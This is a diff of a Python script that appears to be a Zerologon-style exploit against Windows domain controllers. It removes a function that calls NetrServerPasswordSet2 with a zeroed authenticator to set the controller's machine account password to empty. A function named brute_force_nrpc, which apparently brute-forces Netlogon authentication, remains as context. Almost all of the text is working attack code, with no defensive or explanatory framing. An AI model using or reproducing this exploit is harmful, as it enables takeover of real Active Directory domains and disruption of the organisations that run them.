@@ -11,28 +11,6 @@ from binascii import hexlify, unhexlify
 DC_HOSTNAME = ''
 DC_IP = ''
 
-def changement_mdp(dc_primary_name, dc_account_name, dc_computer_name, client_credential):
-  try:
-    requete = nrpc.NetrServerPasswordSet2()
-    requete['PrimaryName'] = dc_primary_name + '\x00'
-    requete['AccountName'] = dc_account_name + '\x00'
-    requete['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
-    requete['ComputerName'] = dc_computer_name + '\x00'
-
-    authenticateur = nrpc.NETLOGON_AUTHENTICATOR()
-    authenticateur['Credential'] = client_credential
-    authenticateur['Timestamp'] = b'\x00' * 4
-
-    requete['Authenticator'] = authenticateur
-    requete['ClearNewPassword'] = b'\x00' * 516
-
-    rpc_con.request(requete)
-
-  except:
-    pass
-
-  return rpc_con
-
 
 def brute_force_nrpc(dc_primary_name, dc_ip, dc_computer_name, dc_account_name):
 
